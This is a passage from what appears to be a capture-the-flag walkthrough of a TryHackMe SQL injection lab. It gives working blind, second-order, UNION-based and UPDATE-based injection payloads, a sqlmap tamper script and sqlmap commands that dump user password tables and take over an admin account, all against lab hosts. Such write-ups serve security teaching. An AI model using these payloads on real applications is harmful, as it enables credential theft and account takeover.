starting position, and the third argument is the length of the substring
that will be returned.

``` {#03f4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
SUBSTR( string, <start>, <length>)
```

Below is an example of
[substr](https://sqlite.org/lang_corefunc.html#substr){.markup--anchor
.markup--p-anchor
data-href="https://sqlite.org/lang_corefunc.html#substr"
rel="noopener ugc nofollow noopener" target="_blank"} in action --- the
character after the equal (=) sign demonstrates the substring returned.

``` {#86b4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="csharp"}
-- Changing startSUBSTR("THM{Blind}", 1,1) = TSUBSTR("THM{Blind}", 2,1) = HSUBSTR("THM{Blind}", 3,1) = M-- Changing lengthSUBSTR("THM{Blind}", 1,3) = THM
```

The next step will be to enter the admin's password as a string into the
[substr](https://sqlite.org/lang_corefunc.html#substr){.markup--anchor
.markup--p-anchor
data-href="https://sqlite.org/lang_corefunc.html#substr"
rel="noopener ugc nofollow noopener" target="_blank"} function. This can
be achieved with the following query:

``` {#45bd .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
(SELECT password FROM users LIMIT 0,1)
```

The
[LIMIT](https://sqlite.org/lang_select.html#limitoffset){.markup--anchor
.markup--p-anchor
data-href="https://sqlite.org/lang_select.html#limitoffset"
rel="noopener ugc nofollow noopener" target="_blank"} clause is used to
limit the amount of data returned by the SELECT statement. The first
number, 0, is the offset and the second integer is the limit:

``` {#1437 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="xml"}
LIMIT <OFFSET>, <LIMIT>
```

Below are a few examples of the
[LIMIT](https://sqlite.org/lang_select.html#limitoffset){.markup--anchor
.markup--p-anchor
data-href="https://sqlite.org/lang_select.html#limitoffset"
rel="noopener ugc nofollow noopener" target="_blank"} clause in action.
The right table represents the user table.

``` {#c232 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="shell"}
sqlite> SELECT password FROM users LIMIT 0,1THM{Blind}sqlite> SELECT password FROM users LIMIT 1,1Summer2019!sqlite> SELECT password FROM users LIMIT 0,2THM{Blind}Summer2019!
```

THM{Blind}Summer2019!Viking123

The SQL query to return the first character of the admin's password can
be seen here:

``` {#28c3 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="scss"}
SUBSTR((SELECT password FROM users LIMIT 0,1),1,1)
```

Now we will need a way to compare the first character of the password
with our guessed value. Comparing the characters are easy, and we could
do it as follows:

``` {#4aa4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'
```

However, whether this approach works or not will be depending on how the
application handles the inputs. The application will convert the
username to lowercase for this challenge, which breaks the mentioned
approach since capital T is not the same as lowercase t. The hex
representation of ASCII T is 0x54 and 0x74 for lowercase t. To deal with
this, we can input our character as hex representation via the
substitution type
[X](https://www.sqlite.org/printf.html#substitution_types){.markup--anchor
.markup--p-anchor
data-href="https://www.sqlite.org/printf.html#substitution_types"
rel="noopener ugc nofollow noopener" target="_blank"} and then use
SQLite's
[CAST](https://sqlite.org/lang_expr.html#castexpr){.markup--anchor
.markup--p-anchor data-href="https://sqlite.org/lang_expr.html#castexpr"
rel="noopener ugc nofollow noopener" target="_blank"} expression to
convert the value to the datatype the database expects.

"x,X: The argument is an integer which is displayed in hexadecimal.
Lower-case hexadecimal is used for %x and upper-case is used for
%X" --- ([sqlite.org](https://www.sqlite.org/printf.html#substitution_types){.markup--anchor
.markup--p-anchor
data-href="https://www.sqlite.org/printf.html#substitution_types"
rel="noopener ugc nofollow noopener" target="_blank"})

This means that we can input T as X'54\'. To convert the value to
SQLite's Text type, we can use the CAST expression as follows:
CAST(X'54\' as Text). Our final query now looks as follows:

``` {#c4af .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)
```

Before using the query we have built, we will need to make it fit in
with the original query. Our query will be placed in the username field.
We can close the username parameter by adding a single quote (') and
then append an AND operator to add our condition to it. Then append two
dashes ( --- ) to comment out the password check at the end of the
query. With this done, our malicious query look as follows:

``` {#97c4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="csharp"}
admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
```

When this is injected into the username field, the final query executed
by the database will be:

``` {#2e19 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SELECT id, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)
```

If the application responds with a 302 redirect, then we have found the
password's first character. To get the entire password, the attacker
must inject multiple tests for each character in the password. Testing
every single character is tedious and is more easily achieved with a
script. One easy solution is to loop over every possible ASCII character
and compare it with the database's character. The mentioned method
generates a lot of traffic toward the target and is not the most
efficient method. An example script is provided inside the machine and
can be view and downloaded by going to
[**http://10.10.110.236:5000/view/challenge3/challenge3-exploit.py**](http://10.10.110.236:5000/view/challenge3/challenge3-exploit.py){.markup--anchor
.markup--p-anchor
data-href="http://10.10.110.236:5000/view/challenge3/challenge3-exploit.py"
rel="noopener ugc nofollow noopener" target="_blank"}**;** note that it
will be necessary to change the password length with the password_len
variable. The length of the password can be found by asking the
database. For example, in the query below, we ask the database if the
length of the password equals 37:

``` {#42ff .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
admin' AND length((SELECT password from users where username='admin'))==37-- -
```

<figure id="1db7" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*MGEkcfTQhMf4DWy-.png"
class="graf-image" data-image-id="0*MGEkcfTQhMf4DWy-.png"
data-width="419" data-height="394" />
</figure>

<figure id="e8f6" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*9uWVsQ-thJSiHwk2.png"
class="graf-image" data-image-id="0*9uWVsQ-thJSiHwk2.png"
data-width="387" data-height="102" />
</figure>

Also, the script requires an unnecessary amount of requests. An extra
challenge could be to build a more efficient tool to retrieve the
password.

An alternative way to solve this challenge is by using a tool such as
sqlmap, which is an open source tool that automates the process of
detecting and exploiting SQL injection flaws. The following command can
be used to exploit the vulnerability with sqlmap:

``` {#ecd3 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
sqlmap -u http://10.10.110.236:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump
```

<figure id="bdc9" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*ELuZnXVsODS1ZDS3.png"
class="graf-image" data-image-id="0*ELuZnXVsODS1ZDS3.png"
data-width="677" data-height="324" />
</figure>

### Task 7: Vulnerable Startup: Vulnerable Notes {#2920 .graf .graf--h3 .graf-after--figure name="2920"}

### Goal {#be15 .graf .graf--h3 .graf-after--h3 name="be15"}

Here, the previous vulnerabilities have been fixed, and the login form
is no longer vulnerable to SQL injection. The team has added a new note
function, allowing users to add notes on their page. The goal of this
challenge is to find the vulnerability and dump the database to find the
flag.

### Description {#7acb .graf .graf--h3 .graf-after--p name="7acb"}

By registering a new account and logging in to the application, the user
can navigate to the new note function by clicking "Notes" in the top
left menu. Here, it is possible to add new notes, and all the user's
notes are listed on the bottom of the page, as seen here:

<figure id="3ca5" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*vJyV_rzrEjco93HB.png"
class="graf-image" data-image-id="0*vJyV_rzrEjco93HB.png"
data-width="828" data-height="928" />
</figure>

The notes function is not directly vulnerable, as the function to insert
notes is safe because it uses parameterized queries. With parameterized
queries, the SQL statement is specified first with placeholders (?) for
the parameters. Then the user input is passed into each parameter of the
query later. Parameterized queries allow the database to distinguish
between code and data, regardless of the input.

``` {#fe34 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ruby"}
INSERT INTO notes (username, title, note) VALUES (?, ?, ?)
```

Even though parameterized queries are used, the server will accept
malicious data and place it in the database if the application does not
sanitize it. Still, the parameterized query prevents the input from
leading to SQL injection. Since the application might accept malicious
data, all queries must use parameterized queries, and not only for
queries directly accepting user input.

The user registration function also utilizes parameterized queries, so
when the query below is executed, only the INSERT statement gets
executed. It will accept any malicious input and place it in the
database if it doesn't sanitize it, but the parameterized query prevents
the input from leading to SQL injection.

``` {#d67b .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
INSERT INTO users (username, password) VALUES (?, ?)
```

However, the query that fetches all of the notes belonging to a user
does not use parameterized queries. The username is concatenated
directly into the query, making it vulnerable to SQL injection.

``` {#e241 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SELECT title, note FROM notes WHERE username = '" + username + "'
```

This means that if we register a user with a malicious name, everything
will be fine until the user navigates to the notes page and the unsafe
query tries to fetch the data for the malicious user.

By creating a user with the following name:

``` {#0104 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
' union select 1,2'
```

We should be able to trigger the secondary injection:

<figure id="8a8a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*hEgPzRRDnfLFwWaC.png"
class="graf-image" data-image-id="0*hEgPzRRDnfLFwWaC.png"
data-width="367" data-height="326" />
</figure>

With this username, the application performs the following query:

``` {#0bc5 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SELECT title, note FROM notes WHERE username = '' union select 1,2''
```

Then on the notes page as the new user, we can see that the first column
in the query is the note title, and the second column is the note
itself:

<figure id="70da" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*WK-nphSvMlY01ntW.png"
class="graf-image" data-image-id="0*WK-nphSvMlY01ntW.png"
data-width="817" data-height="799" />
</figure>

With this knowledge, this is rather easy to exploit. For example, to get
all the tables from the database, we can create a user with the name:

``` {#e503 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''
```

To find the flag among the passwords, register a user with the name:

' union select 1,group_concat(password) from users'

Automating Exploitation Using Sqlmap

It is possible to use sqlmap to automate this attack, but a standard
attack with sqlmap will fail. The injection happens at the user
registration, but the vulnerable function is located on the notes page.
For sqlmap to exploit this vulnerability, it must do the following
steps:

1.  [Register a malicious user]{#bb79}
2.  [Login with the malicious user]{#10e2}
3.  [Go to the notes page to trigger the injection]{#e225}

It is possible to achieve all of the necessary steps by creating a
tamper script. Sqlmap supports tamper scripts, which are scripts used
for tampering with injection data. With a tamper script, we can easily
modify the payload, for example, adding a custom encoding to it. It also
allows us to set other things, such as cookies.

There are two custom functions in the tamper script below. The first
function is *create_account()*, which register a user with sqlmap's
payload as name and 'asd' as password. The next custom function is
*login()*, which logs sqlmap in as the newly created user and returns
the Flask session cookie. *tamper()* is the main function in the script,
and it has the *payload* and *\*\*kwargs* as arguments. *\*\*kwargs*
holds information such as the HTTP headers, which we need to place the
Flask session cookie onto the request to allow sqlmap to go to the notes
page to trigger the SQL injection. The *tamper()* function first gets
the headers from *kwargs*, then creates a new user on the application,
and then it logs in to the application and sets the Flask session onto
the HTTP header object.

``` {#139d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="kotlin"}
#!/usr/bin/pythonimport requestsfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALaddress = "http://10.10.1.134:5000/challenge4"password = "asd"def dependencies():passdef create_account(payload):with requests.Session() as s:data = {"username": payload, "password": password}resp = s.post(f"{address}/signup", data=data)def login(payload):with requests.Session() as s:data = {"username": payload, "password": password}resp = s.post(f"{address}/login", data=data)sessid = s.cookies.get("session", None)return "session={}".format(sessid)def tamper(payload, **kwargs):headers = kwargs.get("headers", {})create_account(payload)headers["Cookie"] = login(payload)return payload
```

The folder where the tamper script is located will also need an empty
*\_\_init\_\_.py* file for sqlmap to be able to load it. Before starting
sqlmap with the tamper script, change the address and password variable
inside the script. With this done, it is possible to exploit the
vulnerability with the following command:

``` {#2123 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
sqlmap --tamper so-tamper.py --url http://10.10.1.134:5000/challenge4/signup  --data "username=admin&password=asd"--second-url http://10.10.1.134:5000/challenge4/notes  -p username --dbms sqlite --technique=U --no-cast# --tamper so-tamper.py - The tamper script# --url - The URL of the injection point, which is /signup in this case# --data - The POST data from the registraion form to /signup.#   Password must be the same as the password in the tamper script# --second-url http://10.10.1.134:5000/challenge4/notes - Visit this URL to check for results# -p username - The parameter to inject to# --dbms sqlite - To speed things up# --technique=U - The technique to use. [U]nion-based# --no-cast - Turn off payload casting mechanism
```

Dumping the *users* table might be hard without turning off the payload
casting mechanism with the *--- no-cast* parameter. An example of the
difference between casting and no casting can be seen here:

### --- With casting enabled: {#43e9 .graf .graf--h3 .graf-after--p name="43e9"}

``` {#9716 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="csharp"}
admin' union all select min(cast(x'717a717071' as text)||coalesce(cast(sql as text),cast(x'20' as text)))||cast(x'716b786271' as text),null from sqlite_master where tbl_name=cast(x'7573657273' as text)-- daqo'-- 7573657273 is 'users' in ascii
```

### --- Without casting: {#c4c5 .graf .graf--h3 .graf-after--pre name="c4c5"}

``` {#f548 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
admin' union all select cast(x'717a6a7871' as text)||id||cast(x'6774697a7462' as text)||password||cast(x'6774697a7462' as text)||username||cast(x'7162706b71' as text),null from users-- ypfr'
```

When sqlmap asks, answer no to follow 302 redirects, then answer yes to
continue further testing if it detects some WAF/IPS. Answer no when
asked if you want to merge cookies in future requests, and say no to
reduce the number of requests. As seen in the image below, sqlmap was
able to find the vulnerability, which allows us to automate the
exploitation of it.

<figure id="7ef6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*JLljVGaBigfnVnBT.png"
class="graf-image" data-image-id="0*JLljVGaBigfnVnBT.png"
data-width="875" data-height="795" />
</figure>

The flag can then be found by dumping the *users* table:

``` {#5c37 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" --second-url http://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump
```

Sqlmap is quite noisy and will add a lot of users attempting to exploit
this application. Because of this, the output will be trimmed and the
message below can be seen.

``` {#7e5a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
[WARNING] console output will be trimmed to last 256 rows due to large table size
```

However, all the data is saved and written to a dump file, as seen in
the image below. Read the top of the dump file to get the flag:

<figure id="7911" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*G7qNhtg6BVCJwuv1.png"
class="graf-image" data-image-id="0*G7qNhtg6BVCJwuv1.png"
data-width="875" data-height="272" />
</figure>

**NB:** The flag will differ on the live system.

### Task {#a1e3 .graf .graf--h3 .graf-after--p name="a1e3"}

Exploit the vulnerable function and retrieve the flag.

What is the flag for this challenge?

<figure id="3d2f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*jN7fLj1M50JFAA2l.png"
class="graf-image" data-image-id="0*jN7fLj1M50JFAA2l.png"
data-width="615" data-height="627" />
</figure>

<figure id="03bf" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*vCaAmTJOH939WTe5.png"
class="graf-image" data-image-id="0*vCaAmTJOH939WTe5.png"
data-width="303" data-height="56" />
</figure>

<figure id="8b2e" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Kyrww9rPu0A3PZd1.png"
class="graf-image" data-image-id="0*Kyrww9rPu0A3PZd1.png"
data-width="1231" data-height="595" />
</figure>

add "**-T users --- dump**" in the last

``` {#2b51 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
sqlmap --tamper so-tamper.py --url http://10.10.224.106:5000/challenge4/signup --data "username=admin&password=asd" --second-url http://10.10.224.106:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump
```

<figure id="433f" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*KMl5qnmnzwIb3FyP.png"
class="graf-image" data-image-id="0*KMl5qnmnzwIb3FyP.png"
data-width="1347" data-height="535" />
</figure>

### Task 8: Vulnerable Startup: Change Password {#a443 .graf .graf--h3 .graf-after--figure name="a443"}

### Goal {#b559 .graf .graf--h3 .graf-after--h3 name="b559"}

For this challenge, the vulnerability on the note page has been fixed. A
new change password function has been added to the application, so the
users can now change their password by navigating to the Profile page.
The new function is vulnerable to SQL injection because the UPDATE
statement concatenates the username directly into the SQL query, as can
be seen below. The goal here is to exploit the vulnerable function to
gain access to the admin's account.

### Description {#3550 .graf .graf--h3 .graf-after--p name="3550"}

The developer has used a placeholder for the password parameter because
this input comes directly from the user. The username does not come
directly from the user but is rather fetched from the database based on
the user id stored in the session object. Therefore, the developer has
thought that the username was safe to use and concatenated it directly
into the query instead of using a placeholder:

``` {#4815 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
UPDATE users SET password = ? WHERE username = '" + username + "'
```

To exploit this vulnerability and gain access to the admin's user
account, we can create a user with the name `admin'-- -`{.markup--code
.markup--p-code}.

After having registered the malicious user, we can update the password
for our new user to trigger the vulnerability. When changing the
password, the application executes two queries. First, it asks the
database for the username and password for our current user:

``` {#2a52 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SELECT username, password FROM users WHERE id = ?
```

If all checks are fine, it will try to update the password for our user.
Since the username gets concatenated directly into the SQL query, the
executed query will look as follows:

``` {#2480 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
UPDATE users SET password = ? WHERE username = 'admin' -- -'
```

This means that instead of updating the password for
`admin' -- -`{.markup--code .markup--p-code}, the application updated
the password for the *admin* user. After having updated the password, it
is possible to log in as admin with the new password and view the flag.

### Task {#09a0 .graf .graf--h3 .graf-after--p name="09a0"}

Create a new user and exploit the vulnerability in the update password
function to access the admin account to get the flag.

Lets create new user with **admin' --- -:asd**

<figure id="71cd" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*YgV9_ys3ryNPY24y.png"
class="graf-image" data-image-id="0*YgV9_ys3ryNPY24y.png"
data-width="349" data-height="324" />
</figure>

Now Login into the user **admin' --- -:asd**

<figure id="c554" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ov_0EOMfAKwL1g47.png"
class="graf-image" data-image-id="0*ov_0EOMfAKwL1g47.png"
data-width="337" data-height="323" />
</figure>

After login goto profile page and change password with this query

old password = **asd**

new password = **pass**

<figure id="c48d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*jRTI20WF4o90vrKK.png"
class="graf-image" data-image-id="0*jRTI20WF4o90vrKK.png"
data-width="875" data-height="362" />
</figure>

yes password has been changed now login into admin as **admin:pass**

<figure id="9129" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*-syDqYEo9-WJApY7.png"
class="graf-image" data-image-id="0*-syDqYEo9-WJApY7.png"
data-width="356" data-height="333" />
</figure>

<figure id="3c1a" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*v_H_pYQDuQMxHqIC.png"
class="graf-image" data-image-id="0*v_H_pYQDuQMxHqIC.png"
data-width="580" data-height="272" />
</figure>

BOOM ! We got Flag

### Task 9: Vulnerable Startup: Book Title {#317e .graf .graf--h3 .graf-after--p name="317e"}

### Goal {#b15c .graf .graf--h3 .graf-after--h3 name="b15c"}

A new function has been added to the page, and it is now possible to
search books in the database. The new search function is vulnerable to
SQL injection because it concatenates the user input directly into the
SQL statement. The goal of the task is to abuse this vulnerability to
find the hidden flag.

### Description {#16d9 .graf .graf--h3 .graf-after--p name="16d9"}

When the user first logs into the challenge, they are presented with a
message saying:

``` {#3219 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
Testing a new function to search for books, check it out here
```

The 'here' text is a link taking the user to
[http://10.10.141.207/challenge6/book?title=test](http://10.10.141.207/challenge6/book?title=test){.markup--anchor
.markup--p-anchor
data-href="http://10.10.141.207/challenge6/book?title=test"
rel="noopener ugc nofollow noopener" target="_blank"}, which is the page
containing the vulnerable search function and can be seen here:

<figure id="491a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*wM3CDCmkHx8P3Kg9.png"
class="graf-image" data-image-id="0*wM3CDCmkHx8P3Kg9.png"
data-width="875" data-height="342" />
</figure>

The web page performs a GET request with the parameter
`title`{.markup--code .markup--p-code} when searching for a book. The
query it performs can be seen here:

``` {#cf4b .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '" + title + "%')
```

All we need to do to abuse this is closing the LIKE operand to the right
of the LIKE operator. For example, we can dump all the books in the
database by injecting the following command:

``` {#cbd4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="vbnet"}
') or 1=1-- -
```

### Task {#6ef0 .graf .graf--h3 .graf-after--pre name="6ef0"}

Use what you learned about UNION-based SQL injection and exploit the
vulnerable book search function to retrieve the flag.

Create new user **sam2:asd**

and login into account

<figure id="2a2f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*gvLbXyaZJTlu84pO.png"
class="graf-image" data-image-id="0*gvLbXyaZJTlu84pO.png"
data-width="875" data-height="241" />
</figure>

we can dump all the books in the database by injecting the following
command:

``` {#1eb3 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="vbnet"}
') or 1=1-- -
```

<figure id="4430" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*m7iJn2p1s3emI19X.png"
class="graf-image" data-image-id="0*m7iJn2p1s3emI19X.png"
data-width="601" data-height="491" />
</figure>

Without knowing the number of columns upfront, the attacker must first
enumerate the number of columns by systematically injecting queries with
different numbers of columns until it is show error. For example:

Try every one by one every payload

``` {#e333 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
') order by 1-- -
') order by 2-- -
') order by 3-- -
') order by 4-- -
') order by 5-- -
```

<figure id="994f" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*e8OmtsR20IJivYI3.png"
class="graf-image" data-image-id="0*e8OmtsR20IJivYI3.png"
data-width="676" data-height="325" />
</figure>

when i try

``` {#474f .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="vbnet"}
') order by 5-- -
```

<figure id="78ed" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*WogGF1ZscCQV5V-r.png"
class="graf-image" data-image-id="0*WogGF1ZscCQV5V-r.png"
data-width="690" data-height="330" />
</figure>

It did'nt show me anything it means this is error for attacker

it means in the database there is 4 columns only

Lets' Check how many columns are vulnerable to do this we use **UNION
SELECT**

``` {#86bc .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
') union select 1,2,3,4-- -
```

<figure id="9a23" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*nvl_8JjS9eGf_Jzw.png"
class="graf-image" data-image-id="0*nvl_8JjS9eGf_Jzw.png"
data-width="701" data-height="365" />
</figure>

the query shows 3 columns are vulnerable **{2,3,4}** position

lets fetch the information from the database

if you know mysql you can easly understand this query

``` {#ba30 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
') union select 1,group_concat(username),group_concat(password),4 from users-- -
```

<figure id="2f63" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*19NwR1LFhyCri1qU.png"
class="graf-image" data-image-id="0*19NwR1LFhyCri1qU.png"
data-width="875" data-height="367" />
</figure>

### Task 10: Vulnerable Startup: Book Title 2 {#0f20 .graf .graf--h3 .graf-after--figure name="0f20"}

### Goal {#ffc9 .graf .graf--h3 .graf-after--h3 name="ffc9"}

In this challenge, the application performs a query early in the
process. It then uses the result from the first query in the second
query later without sanitization. Both queries are vulnerable, and the
first query can be exploited through blind SQL injection. However, since
the second query is also vulnerable, it is possible to simplify the
exploitation and use UNION based injection instead of Boolean-based
blind injection; making the exploitation easier and less noisy. The goal
of the task is to abuse this vulnerability without using blind SQL
injection and retrieve the flag.

### Description {#2d6f .graf .graf--h3 .graf-after--p name="2d6f"}

When the user first logs into the challenge, they are presented with a
message saying:

``` {#3484 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
Testing a new function to search for books, check it out here
```

The 'here' text is a link taking the user to
[http://10.10.141.207:5000/challenge7/book?title=test](http://10.10.141.207/challenge7/book?title=test){.markup--anchor
.markup--p-anchor
data-href="http://10.10.141.207/challenge7/book?title=test"
rel="noopener ugc nofollow noopener" target="_blank"}, which is the page
containing the vulnerable search function and can be seen here:

<figure id="6078" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*dwxRYn2Nivpj0TXl.png"
class="graf-image" data-image-id="0*dwxRYn2Nivpj0TXl.png"
data-width="872" data-height="333" />
</figure>

When searching for a book title, the web page performs a GET request.
The application then performs two queries where the first query gets the
book's ID, then later on in the process, a new SQL query is performed to
get all information about the book. The two queries can be seen here:

``` {#34f4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ini"}
bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)if bid:query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
```

First, we will limit the result to zero rows, which can be done by not
giving it any input or input we know does not exist. Then we can use the
UNION clause to control what the first query returns, which is the data
that will be used in the second query. Meaning that we can inject the
following value into the search field:

``` {#4002 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
' union select 'STRING
```

After injecting the code above, the application will perform the
following SQL queries:

<figure id="e772" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*MWZeF8R5S7kIWT0l.png"
class="graf-image" data-image-id="0*MWZeF8R5S7kIWT0l.png"
data-width="676" data-height="203" />
</figure>

From queries, we can see that the result from query one is STRING%,
which is used in the WHERE clause of the second query.

If we replace 'STRING with a number that exists in the database, the
application should return a valid object. However, the application adds
a wildcard (%) to the string, meaning that we must comment out the
wildcard first. The wildcard can be commented out by appending ' --- ---
to the end of the string we are injecting. For example, if we inject the
following line:

``` {#3b13 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
' union select '1'-- -
```

The application should display the book with ID 1 back to the user, as
seen here:

<figure id="5879" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Fs59HyzhcqwPNt2L.png"
class="graf-image" data-image-id="0*Fs59HyzhcqwPNt2L.png"
data-width="848" data-height="351" />
</figure>

If we did not limit the result to zero rows first, we would not have
gotten the output of the UNION statement but rather the content from the
LIKE clause. For example, by injecting the following string:

``` {#0566 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
test' union select '1'-- -
```

The application would have executed the following queries:.

<figure id="15f1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*aIWwFYNnTRfxjfH6.png"
class="graf-image" data-image-id="0*aIWwFYNnTRfxjfH6.png"
data-width="676" data-height="201" />
</figure>

Now that we have full control of the second query, we can use
UNION-based SQL injection to extract data from the database. The goal is
to make the second query look something similar to the following query:

``` {#83ad .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
SELECT * FROM books WHERE id = '' union select 1,2,3,4-- -
```

Making the application execute the query above should be as easy as
injecting the following query:

``` {#13f1 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
' union select '1' union select 1,2,3,4-- -
```

However, we are closing the string that is supposed to be returned by
appending the single quote (') before the second UNION clause. To make
the query work and return our second UNION clause, we will have to
escape the single quote. Escaping the single quote can be done by
doubling up the quote (''). After having doubled the quotes, we have the
following string:

``` {#5d90 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
' union select '-1''union select 1,2,3,4-- -
```

Injecting the string above will return the page seen here:

